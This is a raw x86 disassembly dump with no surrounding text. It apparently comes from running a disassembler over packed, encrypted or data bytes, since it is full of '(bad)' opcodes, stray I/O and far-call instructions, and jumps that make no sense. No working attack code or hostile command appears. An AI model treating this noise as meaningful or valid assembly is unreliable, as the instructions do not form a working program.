  422e59:	(bad)  
  422e5b:	sbb    BYTE PTR [edi+eax*8],bl
  422e5e:	(bad)  
  422e5f:	mov    ebp,0xed892018
  422e64:	and    eax,0x508e1b28
  422e69:	mov    bh,0x2e
  422e6b:	cmc    
  422e6c:	jnp    0x422ed9
  422e6e:	mov    cl,0xf
  422e70:	xor    BYTE PTR [edi+0x22],ah
  422e73:	inc    eax
  422e74:	push   0x4a4e213c
  422e79:	shr    DWORD PTR [edx+ebp*4],1
  422e7c:	mov    esi,DWORD PTR [ebx+esi*8-0x6d9d3ffc]
  422e83:	inc    edi
  422e84:	sbb    BYTE PTR [edx+0x752daeda],0xd4
  422e8b:	repz enter 0xa2a6,0xca
  422e90:	das    
  422e91:	mov    cl,0x19
  422e93:	cmp    ch,BYTE PTR [ebp-0x1d5f51fa]
  422e99:	mov    bh,BYTE PTR [esi]
  422e9b:	pop    esi
  422e9c:	and    ah,BYTE PTR [ebx+0x60]
  422e9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ea0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ea1:	xchg   edx,eax
  422ea2:	cmp    ch,dh
  422ea4:	aam    0x63
  422ea6:	sub    DWORD PTR [esi-0x7],esi
  422ea9:	(bad)  
  422eaa:	daa    
  422eab:	mov    DWORD PTR [esi-0x77da6fa4],eax
  422eb1:	push   ebx
  422eb2:	call   0xa6ed4b6a
  422eb7:	sbb    eax,ebp
  422eb9:	dec    eax
  422eba:	call   0xcd:0x439f81d
  422ec1:	cmc    
  422ec2:	adc    bl,BYTE PTR [eax+0x1a636df]
  422ec8:	(bad)  
  422ec9:	sbb    eax,0x58d041d6
  422ece:	adc    al,0xf2
  422ed0:	jge    0x422f47
  422ed2:	mov    al,0xd9
  422ed4:	mov    esi,0x9ba0ad01
  422ed9:	add    dh,ch
  422edb:	test   cl,ah
  422edd:	mov    ds:0x933f9e6c,eax
  422ee2:	mov    eax,0x2767b03b
  422ee7:	retf   
  422ee8:	jo     0x422f5a
  422eea:	adc    al,0xd2
  422eec:	push   edi
  422eed:	in     al,dx
  422eee:	mov    eax,0x4c001d96
  422ef3:	add    bh,BYTE PTR [edi]
  422ef5:	or     eax,0x97008395
  422efa:	xchg   ebp,eax
  422efb:	dec    esp
  422efc:	dec    edx
  422efd:	pop    esi
  422efe:	dec    edi
  422eff:	popa   
  422f00:	lods   eax,DWORD PTR ds:[esi]
  422f01:	inc    esp
  422f02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f03:	sbb    eax,0x82745818
  422f08:	les    edx,FWORD PTR [esi+0x3b]
  422f0b:	jecxz  0x422ec7
  422f0d:	xor    esi,DWORD PTR [edi]
  422f0f:	pusha  
  422f10:	loop   0x422ed0
  422f12:	ds mov edx,0x52f3fdbf
  422f18:	sbb    DWORD PTR [eax],ebx
  422f1a:	mov    cl,0xf5
  422f1c:	pop    ebp
  422f1d:	pop    ebx
  422f1e:	lods   al,BYTE PTR ds:[esi]
  422f1f:	push   esi
  422f20:	or     dh,bh
  422f22:	cdq    
  422f23:	add    eax,0xdb054f0d
  422f28:	cmp    eax,0x70bc6561
  422f2d:	sbb    ebp,DWORD PTR [ebp+0x3fef897b]
  422f33:	xchg   edx,eax
  422f34:	pop    es
  422f35:	xchg   ebp,edi
  422f37:	stos   BYTE PTR es:[edi],al
  422f38:	loop   0x422f97
  422f3a:	fcmovne st,st(1)
  422f3c:	sub    eax,0x463f64f
  422f41:	imul   esp,DWORD PTR [eax],0x46
	...
  422f50:	add    BYTE PTR [edx],al
  422f52:	xor    ecx,DWORD PTR [ebx-0x4c4744c8]
  422f58:	cmp    esi,DWORD PTR [esi-0x1f481422]
  422f5e:	ret    
  422f5f:	sub    DWORD PTR [eax],edi
  422f61:	(bad)  
  422f62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f63:	add    DWORD PTR [eax],eax
  422f65:	stos   DWORD PTR es:[edi],eax
  422f66:	add    eax,DWORD PTR [eax]
  422f68:	add    BYTE PTR [ebx-0x21],dl
  422f6b:	xor    BYTE PTR [edx+ebp*4+0x228b783f],0x53
  422f73:	push   edx
  422f74:	icebp  
  422f75:	neg    BYTE PTR [esi+0x26]
  422f78:	bound  edx,QWORD PTR [esi+0x37220c93]
  422f7e:	rcr    BYTE PTR [edx+0xb],0x1e
  422f82:	or     al,0x7b
  422f84:	test   DWORD PTR [ecx+esi*8],ebx
  422f87:	(bad)  
  422f88:	hlt    
  422f89:	int3   
  422f8a:	adc    cl,bh
  422f8c:	adc    DWORD PTR [esi],eax
  422f8e:	mov    eax,ds:0x5038e9af
  422f93:	push   ebp
  422f94:	sub    eax,0x67d0f2ca
  422f99:	and    dh,BYTE PTR [ebx]
  422f9b:	inc    ebx
  422f9c:	mov    ds:0x89e15a86,eax
  422fa1:	int3   
  422fa2:	xchg   ebx,eax
  422fa3:	ss and eax,0x44c9111b
  422fa9:	jge    0x422ff1
  422fab:	pop    esi
  422fac:	dec    esp
  422fad:	shl    ah,cl
  422faf:	popf   
  422fb0:	es sbb eax,0xb9a5bcf2
  422fb6:	push   cs
  422fb7:	push   ss
  422fb8:	int    0x9d
  422fba:	xlat   BYTE PTR ds:[ebx]
  422fbb:	push   cs
  422fbc:	aad    0x32
  422fbe:	inc    edi
  422fbf:	shr    bh,1
  422fc1:	lods   eax,DWORD PTR ds:[esi]
  422fc2:	pop    esi
  422fc3:	mov    esp,0x9beff7cb
  422fc8:	adc    edx,ebp
  422fca:	aaa    
  422fcb:	retf   
  422fcc:	mov    BYTE PTR [ebx-0x54],dh
  422fcf:	in     al,dx
  422fd0:	pop    ebx
  422fd1:	nop
  422fd2:	fsub   st,st(4)
  422fd4:	add    DWORD PTR [ebp+edx*2-0x6d],0x31
  422fd9:	fsubr  DWORD PTR [edx-0x14]
  422fdc:	scas   eax,DWORD PTR es:[edi]
  422fdd:	inc    ecx
  422fde:	cld    
  422fdf:	mov    BYTE PTR [esi],bl
  422fe1:	mov    ch,0x49
  422fe3:	or     al,0xe3
  422fe5:	clc    
  422fe6:	aas    
  422fe7:	imul   ebp,DWORD PTR [edi-0x15],0xffffffbe
  422feb:	das    
  422fec:	xchg   edi,eax
  422fed:	xchg   BYTE PTR [ecx-0x17963c61],cl
  422ff3:	mov    ebx,0x9bd586c5
  422ff8:	pop    ebp
  422ff9:	(bad)  
  422ffa:	mov    ah,0x74
  422ffc:	pushf  
  422ffd:	test   DWORD PTR [ebx+0x6f74e2e1],0x3aa9ec4
  423007:	les    edi,FWORD PTR [ecx]
  423009:	in     al,dx
  42300a:	push   ss
  42300b:	inc    edx
  42300c:	mov    ebx,0x409d3738
  423011:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423012:	xchg   ebp,eax
  423013:	mov    ds:0x357d6feb,al
  423018:	cmp    ah,BYTE PTR [edi-0x46]
  42301b:	and    al,0x64
  42301d:	popa   
  42301e:	push   ecx
  42301f:	inc    ecx
  423020:	aam    0xa6
  423022:	inc    esp
  423023:	mov    edx,0xa147a975
  423028:	jle    0x42301a
  42302a:	pop    ds
  42302b:	dec    esi
  42302c:	dec    ebx
  42302d:	pop    ss
  42302e:	xchg   ecx,eax
  42302f:	into   
  423030:	mov    esi,0xcee37da3
  423035:	push   ss
  423036:	jp     0x4230a1
  423038:	jb     0x422ff4
  42303a:	call   0xfc48:0xd05d7fe1
  423041:	xor    al,0xee
  423043:	mov    cl,0x9
  423045:	stc    
  423046:	nop
  423047:	inc    edi
  423048:	aam    0xd8
  42304a:	jge    0x42308a
  42304c:	cmp    eax,0xf2b66a80
  423051:	push   ebx
  423052:	rcr    DWORD PTR [ecx-0x181a5eb2],1
  423058:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423059:	in     al,0x7e
  42305b:	mov    bl,0x84
  42305d:	push   esi
  42305e:	xchg   BYTE PTR [edx+0x6d],bl
  423061:	jmp    0x423019
  423063:	adc    BYTE PTR [edx+0x33],0x6f
  423067:	jmp    0x423065
  423069:	adc    DWORD PTR [ebp-0x4a],ecx
  42306c:	and    eax,0xb775678b
  423071:	rcl    edi,cl
  423073:	mov    ch,0xc
  423075:	out    dx,eax
  423076:	mov    al,ds:0xf4ba40db
  42307b:	inc    ebx
  42307c:	js     0x42302a
  42307e:	mov    ebx,0xb779229e
  423083:	jno    0x4230ba
  423085:	js     0x4230c4
  423087:	xlat   BYTE PTR ds:[ebx]
  423088:	sub    bl,dl
  42308a:	in     al,dx
  42308b:	mov    ch,BYTE PTR [edx+0x70]
  42308e:	iret   
  42308f:	data16 mov ah,0xe4
  423092:	pop    ss
  423093:	retf   0xa7d4
  423096:	jo     0x423068
  423098:	sbb    eax,0x9e70ee9d
  42309d:	aas    
  42309e:	xchg   ebx,eax
  42309f:	cmp    dl,BYTE PTR [eax+0x6a40454a]
  4230a5:	xor    ebp,DWORD PTR [edi+0x43]
  4230a8:	retf   0xe74a
  4230ab:	xchg   ebx,eax
  4230ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4230ad:	fwait
  4230ae:	cdq    
  4230af:	stc    
  4230b0:	xchg   BYTE PTR [edi-0x72],bh
  4230b3:	add    ah,BYTE PTR [esi+0x40]
  4230b6:	inc    esp
  4230b7:	popa   
  4230b8:	pop    ecx
  4230b9:	ret    
  4230ba:	scas   eax,DWORD PTR es:[edi]
  4230bb:	arpl   WORD PTR [edx+0x390a3d9e],bp
  4230c1:	mov    ds:0xdd1a7d2a,al
  4230c6:	ins    DWORD PTR es:[edi],dx
  4230c7:	outs   dx,BYTE PTR ds:[esi]
  4230c8:	lods   al,BYTE PTR ds:[esi]
  4230c9:	push   ss
  4230ca:	xchg   ecx,eax
  4230cb:	in     eax,dx
  4230cc:	aas    
  4230cd:	test   BYTE PTR [edi+0x74ec3fd4],ah
  4230d3:	div    DWORD PTR [eax]
  4230d5:	aas    
  4230d6:	add    BYTE PTR [edi-0x45],0xbb
  4230da:	sub    eax,0xe6c0b7f0
  4230df:	loope  0x4230ae
  4230e1:	scas   al,BYTE PTR es:[edi]
  4230e2:	outs   dx,DWORD PTR ds:[esi]
  4230e3:	arpl   WORD PTR [ebp-0x31497349],sp
  4230e9:	mov    eax,0x636f7b15
  4230ee:	xchg   edi,eax
  4230ef:	test   DWORD PTR [edx+0x24],0xb7d5635d
  4230f6:	push   edi
  4230f7:	push   0x32
  4230f9:	lahf   
  4230fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230fb:	idiv   DWORD PTR [bx-0x10d9]
  423100:	and    al,0x19
  423102:	inc    ebx
  423103:	ret    
  423104:	popa   
  423105:	test   al,0x31
  423107:	out    dx,eax
  423108:	mov    edi,DWORD PTR [eax-0x58e3df5a]
  42310e:	aad    0xe2
  423110:	jnp    0x4230d0
  423112:	repz ror BYTE PTR [edi],1
  423115:	cmp    dh,al
  423117:	inc    edx
  423118:	pop    edx
  423119:	rcl    BYTE PTR [ebx-0x72],1
  42311c:	inc    ebx
  42311d:	adc    eax,0xea27d8cf
  423122:	jbe    0x42310c
  423124:	xchg   edi,eax
  423125:	inc    edi
  423126:	aad    0xa5
  423128:	not    DWORD PTR [eax+0xe26556a]
  42312e:	retf   0xd460
  423131:	iret   
  423132:	jmp    DWORD PTR [ebx-0x53ca84e1]
  423138:	test   BYTE PTR [edi+esi*1-0x53],al
  42313c:	aas    
  42313d:	clc    
  42313e:	pop    ebp
  42313f:	hlt    
  423140:	jbe    0x4230f3
  423142:	pop    esp
  423143:	add    al,0xb0
  423145:	outs   dx,DWORD PTR ds:[esi]
  423146:	jmp    0xf1a7585c
  42314b:	fcomip st,st(0)
  42314d:	pushf  
  42314e:	lods   eax,DWORD PTR ds:[esi]
  42314f:	jae    0x42318e
  423151:	or     al,0xd3
  423153:	jns    0x4230fd
  423155:	fiadd  DWORD PTR [eax+esi*1]
  423158:	lock in eax,0x9
  42315b:	pop    ecx
  42315c:	jmp    0xb83508d4
  423161:	xor    al,0x33
  423163:	jnp    0x4231b0
  423165:	and    eax,0x41bee68
  42316a:	xor    dh,al
  42316c:	loope  0x42310f
  42316e:	adc    al,0xc7
  423170:	fimul  WORD PTR [eax]
  423172:	add    DWORD PTR [eax+0x525f5f58],esi
  423178:	and    eax,0xd5958d05
  42317d:	mov    eax,0x6b1ced69
  423182:	mov    BYTE PTR [ebx-0x38],dl
  423185:	push   0x233fe789
  42318a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42318b:	dec    eax
  42318c:	sub    DWORD PTR [ebx+edx*4+0xa],esp
  423190:	xchg   ecx,eax
  423191:	cmp    DWORD PTR [eax],0x5acd0098
  423197:	fild   WORD PTR [eax]
  423199:	cmp    BYTE PTR [esi+0x78],dh
  42319c:	(bad)  
  42319d:	sbb    DWORD PTR [edi],esi
  42319f:	sbb    al,dh
  4231a1:	inc    ebx
  4231a2:	xor    dl,ah
  4231a4:	jo     0x423146
  4231a6:	scas   al,BYTE PTR es:[edi]
  4231a7:	sub    BYTE PTR ds:0xa2b736f1,bl
  4231ad:	xor    DWORD PTR [esi],0x12
  4231b0:	sub    bh,al
  4231b2:	mul    bl
  4231b4:	sti    
  4231b5:	(bad)  
  4231b6:	sbb    BYTE PTR [eax+0x3b],al
  4231b9:	enter  0xac1a,0x10
  4231bd:	leave  
  4231be:	jecxz  0x42323c
  4231c0:	mov    ebx,ebx
  4231c2:	in     eax,dx
  4231c3:	std    
  4231c4:	cld    
  4231c5:	sub    BYTE PTR [edx],dl
  4231c7:	shl    BYTE PTR [ebx+eax*8-0x52b372ad],1
  4231ce:	inc    ebx
  4231cf:	imul   ebx,DWORD PTR [ecx+0x3c],0xe2502e8e
  4231d6:	nop
  4231d7:	adc    DWORD PTR [ebp+0x52d18258],esi
  4231dd:	aad    0x41
  4231df:	jl     0x4231bf
  4231e1:	dec    esp
  4231e2:	repnz call 0xe0bf:0xcb396b74
  4231ea:	mov    ebp,0xef8baa57
  4231ef:	stc    
  4231f0:	or     eax,0x14472aa6
  4231f5:	and    DWORD PTR [esi+0x20708e21],0x9def6beb
  4231ff:	push   edx
  423200:	jnp    0x423196
  423202:	inc    esp
  423203:	add    DWORD PTR [ecx+0x55],edx
  423206:	xor    BYTE PTR [ebp-0x5b777585],ch
  42320c:	cli    
  42320d:	arpl   WORD PTR [esp+edi*2],ax
  423210:	iret   
  423211:	into   
  423212:	outs   dx,BYTE PTR ds:[esi]
  423213:	and    eax,0x84f02128
  423218:	jo     0x423200
  42321a:	ss in  eax,0x2
  42321d:	pop    ebx
  42321e:	xchg   esi,eax
  42321f:	rcr    DWORD PTR [ebx-0x45b7d480],0xd4
  423226:	adc    eax,0x5eaf23b7
  42322b:	loope  0x42323d
  42322d:	std    
  42322e:	jecxz  0x42328c
  423230:	push   eax
  423231:	pop    esi
  423232:	cld    
  423233:	enter  0x66d6,0x67
  423237:	sub    bh,BYTE PTR ds:0x386c4429
  42323d:	popf   
  42323e:	out    dx,al
  42323f:	sub    cl,BYTE PTR [edi]
  423241:	jmp    0x4232ab
  423243:	xlat   BYTE PTR ds:[ebx]
  423244:	dec    ebx
  423245:	mov    eax,ds:0xcbcf65f0
  42324a:	mov    WORD PTR [ecx+0x59cc625e],ss
  423250:	jb     0x423267
  423252:	or     al,0xe4
  423254:	sar    BYTE PTR [ecx+eiz*4+0x25],0x39
  423259:	out    dx,eax
  42325a:	pop    edi
  42325b:	rol    eax,1
  42325d:	pop    edx
  42325e:	repz xchg ebp,esi
  423261:	fisub  DWORD PTR [ebx-0x18]
  423264:	mov    al,ds:0x335aa116
  423269:	pop    edi
  42326a:	sub    DWORD PTR [ebp+ecx*1-0x7a6b1930],esi
  423271:	fsub   st(1),st
  423273:	call   0xecf40a80
  423278:	cmp    DWORD PTR [eax],edi
  42327a:	mov    WORD PTR ds:0x89909883,fs
  423280:	sub    BYTE PTR gs:[eax+eiz*2+0x12],dh
  423285:	aaa    
  423286:	out    dx,eax
  423287:	dec    esp
  423288:	sbb    eax,0x745fd6d3
  42328d:	pop    es
  42328e:	loope  0x4232f7
  423290:	push   0x14b7cb37
  423295:	add    esi,esi
  423297:	pop    ds
  423298:	in     eax,dx
  423299:	lods   eax,DWORD PTR ds:[esi]
  42329a:	test   eax,esp
  42329c:	xor    BYTE PTR [eax+0x2d],ah
  42329f:	mov    cl,0x4f
  4232a1:	fsubr  st,st(4)
  4232a3:	xchg   ebp,eax
  4232a4:	or     BYTE PTR [edi-0x2b7433c],dh
  4232aa:	push   0xffffffdc
  4232ac:	mov    ebp,0xa99cff09
  4232b1:	ficomp WORD PTR ds:0x582b0e18
  4232b7:	and    eax,DWORD PTR [edi-0x29]
  4232ba:	popf   
  4232bb:	enter  0x9da1,0xfb
  4232bf:	dec    ebp
  4232c0:	call   0x8433:0xcdeefd23
  4232c7:	test   ah,dl
  4232c9:	sar    edx,cl
  4232cb:	sbb    BYTE PTR [edx+ebx*8-0x4574dcc6],0xb7
  4232d3:	jnp    0x423328
  4232d5:	dec    esi
  4232d6:	pop    ebp
  4232d7:	cli    
  4232d8:	cdq    
  4232d9:	push   cs
  4232da:	jmp    0x9a34e247
  4232df:	sbb    cl,BYTE PTR [ebx-0x75bb8781]
  4232e5:	xchg   edx,eax
  4232e6:	(bad)  
  4232e7:	sub    al,0xd2
  4232e9:	in     eax,0x51
  4232eb:	nop
  4232ec:	add    DWORD PTR [eax+0xf],ebx
  4232ef:	test   bh,0x82
  4232f2:	sti    
  4232f3:	loop   0x4232f2
  4232f5:	out    dx,eax
  4232f6:	adc    DWORD PTR [edi+0x3edc00a6],eax
  4232fc:	push   eax
  4232fd:	test   DWORD PTR [ecx],edx
  4232ff:	dec    ecx
  423300:	cs xor eax,0xfe11aadf
  423306:	jge    0x42332f
  423308:	fistp  WORD PTR [ebx+0x1a8a445f]
  42330e:	mov    edi,0x1abfab19
  423313:	fadd   DWORD PTR [eax]
	...
  423321:	cli    
  423322:	dec    esp
  423323:	push   es
  423324:	ret    
  423325:	mov    dh,0xcb
  423327:	(bad)  
  423328:	jge    0x423393
  42332a:	cmp    ah,BYTE PTR [edi]
  42332c:	in     al,0x7
  42332e:	jns    0x4232e2
  423330:	pop    eax
  423331:	jb     0x4232de
  423333:	add    DWORD PTR [eax],eax
  423335:	stos   DWORD PTR es:[edi],eax
  423336:	add    eax,DWORD PTR [eax]
  423338:	add    BYTE PTR [eax-0x2b],al
  42333b:	sbb    BYTE PTR [esi+0x65],0x64
  42333f:	inc    edx
  423340:	fwait
  423341:	push   esi
  423342:	cmp    al,0x77
  423344:	shl    DWORD PTR [edi+0x70],cl
  423347:	cdq    
  423348:	bswap  esp
  42334a:	sub    eax,0x8ba34cf5
  42334f:	cld    
  423350:	loope  0x423308
  423352:	and    DWORD PTR [edx+0x20],ecx
  423355:	or     BYTE PTR [ebx],dl
  423357:	or     al,0x49
  423359:	cmp    al,0x6f
  42335b:	rcl    DWORD PTR [edi],0x7e
  42335e:	cli    
  42335f:	(bad)  
  423360:	imul   eax,DWORD PTR [ebx+ebp*1],0x3f6ac9f3
  423367:	data16 and cl,BYTE PTR [ecx+0x2]
  42336b:	mov    dl,0x1b
  42336d:	add    eax,0x3bc3a167
  423372:	fsub   QWORD PTR [eax+0x42]
  423375:	fwait
  423376:	popf   
  423377:	js     0x4233ed
  423379:	mov    al,ds:0xb1299074
  42337e:	or     dl,bl
  423380:	add    BYTE PTR [esi+edx*1-0x14479d10],ah
  423387:	enter  0xd23c,0x6f
  42338b:	mov    al,ds:0x59cea40d
  423390:	mov    ebp,0xf5725587
  423395:	inc    eax
  423396:	push   es
  423397:	cmc    
  423398:	sbb    al,0x8d
  42339a:	into   
  42339b:	mov    ds:0xadfb5dfc,eax
  4233a0:	neg    BYTE PTR [eax+0x65603fc7]
  4233a6:	out    dx,al
  4233a7:	or     al,0xcf
  4233a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4233aa:	test   eax,0xeefd2366
  4233af:	adc    eax,0x55d42b84
  4233b4:	fmul   DWORD PTR [edi*8+0x44ae694b]
  4233bb:	xor    al,0xce
  4233bd:	jge    0x4233c6
  4233bf:	add    eax,0x28606cb2
  4233c4:	mov    edx,0xde12a339
  4233c9:	sar    BYTE PTR [ecx+0x4bc17e5f],1
  4233cf:	xchg   BYTE PTR cs:[edi+0x67],bh
  4233d3:	fisub  WORD PTR [ebp+esi*4+0x7bcfcd6c]
  4233da:	ins    DWORD PTR es:[edi],dx
  4233db:	fucomp st(5)
  4233dd:	shr    DWORD PTR [ebx-0x7b],cl
  4233e0:	mov    ebp,0x7e5f80ec
  4233e5:	ficomp WORD PTR [ebx-0x58bb462c]
  4233eb:	dec    eax
  4233ec:	les    esi,FWORD PTR [edi]
  4233ee:	ja     0x4233ad
  4233f0:	int3   
  4233f1:	cmp    BYTE PTR [esp+ecx*4],ah
  4233f4:	adc    eax,0xd3c1d9cf
  4233f9:	sbb    BYTE PTR [edx+0x3c13dab5],dh
  4233ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423400:	cmp    eax,0xb2bb121c
  423405:	pop    edx
  423406:	xor    dh,ch
  423408:	loopne 0x42341a
  42340a:	nop
  42340b:	inc    edi
  42340c:	push   esi
  42340d:	test   eax,0xeb59b493
  423412:	in     eax,dx
  423413:	jge    0x423413
  423415:	adc    DWORD PTR [eax-0x6a20fe29],ecx
  42341b:	xchg   esi,eax
  42341c:	cmp    al,0x10
  42341e:	cdq    
  42341f:	les    edi,FWORD PTR [ebx+0x5a119a98]
  423425:	das    
  423426:	stos   BYTE PTR es:[edi],al
  423427:	loopne 0x423418
  423429:	adc    eax,0xb8f46b3a
  42342e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42342f:	sub    DWORD PTR ds:0x3147b40,esp
  423435:	add    ecx,esp
  423437:	imul   esp,DWORD PTR [ecx+0x491e078],0xb7346301
  423441:	jb     0x423481
  423443:	cmp    al,0x72
  423445:	aad    0x9d
  423447:	int3   
  423448:	test   DWORD PTR [ecx+0x3a],0xd1d571b2
  42344f:	jg     0x423486
  423451:	sbb    al,0x2a
  423453:	xor    al,0x3f
  423455:	into   
  423456:	push   esi
  423457:	daa    
  423458:	dec    edi
  423459:	pop    es
  42345a:	test   al,0x81
  42345c:	sbb    ecx,edi
  42345e:	sar    BYTE PTR [ebx+ecx*4],cl
  423461:	xor    edx,DWORD PTR [esi+0x70]
  423464:	lar    esi,WORD PTR [ecx-0x49]
  423468:	inc    edx
  423469:	adc    DWORD PTR [esi],esi
  42346b:	pop    ebp
  42346c:	xchg   esp,eax
  42346d:	out    0x37,al
  42346f:	dec    esp
  423470:	dec    esi
  423471:	cmp    ah,dh
  423473:	add    BYTE PTR [esi],0x4b
  423476:	rcr    DWORD PTR [edi+0x1a],0x86
  42347a:	pusha  
  42347b:	(bad)  
  42347c:	iret   
  42347d:	dec    edx
  42347e:	aas    
  42347f:	pushf  
  423480:	mov    cs,edi
  423482:	xchg   ch,al
  423484:	sar    BYTE PTR [esi+ecx*1],0x46
  423488:	xchg   edi,eax
  423489:	jae    0x42348a
  42348b:	jns    0x4234da
  42348d:	xor    ebp,ecx
  42348f:	xchg   di,ax
  423491:	in     eax,dx
  423492:	add    al,0x33
  423494:	adc    edi,ebp
  423496:	icebp  
  423497:	or     eax,0x9ea667fa
  42349c:	jae    0x423498
  42349e:	outs   dx,BYTE PTR ds:[esi]
  42349f:	retf   
  4234a0:	sbb    ch,BYTE PTR [edx]
  4234a2:	xor    DWORD PTR [edi],ebp
  4234a4:	sub    dl,dl
  4234a6:	aad    0xb9
  4234a8:	dec    edi
  4234a9:	aas    
  4234aa:	push   cs
  4234ab:	in     eax,0x5d
  4234ad:	push   0xe0da3d55
  4234b2:	xor    bl,BYTE PTR [ecx+0x2f490d0b]
  4234b8:	push   0xffffffb7
  4234ba:	sbb    BYTE PTR [ebx-0x5f21f3d8],cl
  4234c0:	stc    
  4234c1:	sub    dl,dh
  4234c3:	jae    0x42346d
  4234c5:	hlt    
  4234c6:	mov    al,ds:0xd657194f
  4234cb:	add    DWORD PTR [esi],ecx
  4234cd:	mov    dl,0x6c
  4234cf:	sar    BYTE PTR [ecx+0x2b],1
  4234d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4234d3:	adc    cl,ch
  4234d5:	mov    ebx,0x37a95090
  4234da:	jb     0x42354a
  4234dc:	pusha  
  4234dd:	repz xchg esp,eax
  4234df:	cmc    
  4234e0:	enter  0xc508,0xff
  4234e4:	rol    DWORD PTR [esi+0x5378170],cl
  4234ea:	pop    esi
  4234eb:	xor    eax,0x629e1a5e
  4234f0:	dec    eax
  4234f1:	mov    ebp,0x42903847
  4234f6:	addr16 add esi,esp
  4234f9:	stos   DWORD PTR es:[edi],eax
  4234fa:	aam    0x8d
  4234fc:	push   ecx
  4234fd:	mov    esi,0xcee90f9f
  423502:	out    0xcd,al
  423504:	pop    eax
  423505:	mov    esp,0xe304f52
  42350a:	aaa    
  42350b:	lea    ebx,[eax]
  42350d:	mov    ds:0x3ecc894f,eax
  423512:	inc    esi
  423513:	ficomp DWORD PTR [edi+0x26]
  423516:	stc    
  423517:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423518:	jbe    0x4234f1
  42351a:	push   esp
  42351b:	sub    al,0x5c
  42351d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42351e:	out    dx,eax
  42351f:	and    al,0x41
  423521:	aaa    
  423522:	pusha  
  423523:	jo     0x4234b3
  423525:	aaa    
  423526:	fs jge 0x4234af
  423529:	mov    eax,0x6e2741d8
  42352e:	pop    ebx
  42352f:	mov    ss,WORD PTR [ebx]
  423531:	jne    0x4234b4
  423533:	push   ebp
  423534:	xchg   esi,eax
  423535:	dec    ecx
  423536:	pop    ds
  423537:	popf   
  423538:	dec    ebx
  423539:	scas   eax,DWORD PTR es:[edi]
  42353a:	cmp    esp,ebp
  42353c:	jp     0x4235ac
  42353e:	dec    esi
  42353f:	add    al,0xe5
  423541:	dec    edx
  423542:	retf   
  423543:	xor    BYTE PTR [eax+0x68],0x74
  423547:	adc    eax,0xf3230b95
  42354c:	push   ebp
  42354d:	or     DWORD PTR [ecx+0x415cc25b],ecx
  423553:	int    0x43
  423555:	lods   al,BYTE PTR ds:[esi]
  423556:	sahf   
  423557:	jl     0x423588
  423559:	sub    edx,DWORD PTR [edi]
  42355b:	pop    es
  42355c:	out    dx,eax
  42355d:	ins    BYTE PTR es:[edi],dx
  42355e:	mov    ecx,0xc6e0431f
  423563:	mov    esi,DWORD PTR [esi+eiz*1+0x21f6e179]
  42356a:	pusha  
  42356b:	mov    ch,0xe5
  42356d:	push   esi
  42356e:	push   eax
  42356f:	fs retf 0xec84
  423573:	add    eax,0x8afb1e2f
  423578:	popf   
  423579:	ss retw 0xea75
  42357e:	out    0x69,al
  423580:	adc    al,0x37
  423582:	(bad)  
  423583:	in     eax,dx
  423584:	jecxz  0x423571
  423586:	inc    esp
  423587:	(bad)  
  423589:	xchg   DWORD PTR [ebp+0x76],esp
  42358c:	mov    eax,0xcf681c92
  423591:	(bad)  
  423594:	jns    0x4235f4
  423596:	lods   al,BYTE PTR ds:[esi]
  423597:	sbb    ah,BYTE PTR [ebx]
  423599:	or     DWORD PTR [edi],0xffffffc2
  42359c:	or     eax,DWORD PTR [ecx-0x31]
  42359f:	pop    esi
  4235a0:	xor    cl,BYTE PTR [esi]
  4235a2:	mov    al,ds:0x710275b1
  4235a7:	ret    0x446d
  4235aa:	inc    edx
  4235ab:	fidivr DWORD PTR [eax+0x47]
  4235ae:	mov    ecx,0x349d65d2
  4235b3:	lds    eax,FWORD PTR [eax+0x53008d78]
  4235b9:	jmp    0x4235c4
  4235bb:	cmp    edi,eax
  4235bd:	pop    esp
  4235be:	call   0x7981:0xfef00d46
  4235c5:	ins    DWORD PTR es:[edi],dx
  4235c6:	paddb  mm0,QWORD PTR [eax+0x10]
  4235ca:	jns    0x423632
  4235cc:	mov    edi,0x9c2dd1b8
  4235d1:	cmp    ch,BYTE PTR [esi]
  4235d3:	sahf   
  4235d4:	stos   DWORD PTR es:[edi],eax
  4235d5:	ja     0x4235e1
  4235d7:	mov    BYTE PTR [ebx+edx*1+0x4e],dh
  4235db:	xchg   ecx,eax
  4235dc:	mov    ecx,0xef3d5857
  4235e1:	jbe    0x423638
  4235e3:	add    eax,0xbd2c55ac
  4235e8:	jns    0x4235ae
  4235ea:	xor    al,0xad
  4235ec:	dec    edi
  4235ed:	out    0x7d,eax
  4235ef:	pop    edx
  4235f0:	pop    ss
  4235f1:	cmp    cl,BYTE PTR [edi]
  4235f3:	ret    0xdc6d
  4235f6:	mov    ch,0x34
  4235f8:	stos   BYTE PTR es:[edi],al
  4235f9:	call   0x89f7:0x45868a6
  423600:	in     al,0x17
  423602:	pushf  
  423603:	in     al,0x68
  423605:	repz jecxz 0x423652
  423608:	lahf   
  423609:	ret    0xda30
  42360c:	dec    esi
  42360d:	jmp    0x5a9:0xa73af630
  423614:	(bad)  
  423616:	sub    BYTE PTR ds:0xd4e12de4,0x4c
  42361d:	fstp   st(1)
  42361f:	mov    eax,0x679d9102
  423624:	pop    es
  423625:	aad    0x75
  423627:	jecxz  0x423663
  423629:	fsubr  QWORD PTR [esi]
  42362b:	add    eax,ebx
  42362d:	out    dx,eax
  42362e:	gs ins BYTE PTR es:[edi],dx
  423630:	inc    DWORD PTR [eax+eax*1+0x6dc0da13]
  423637:	dec    ecx
  423638:	sbb    ah,BYTE PTR [ecx]
  42363a:	xor    esp,eax
  42363c:	adc    eax,DWORD PTR [ebp+0x70]
  42363f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
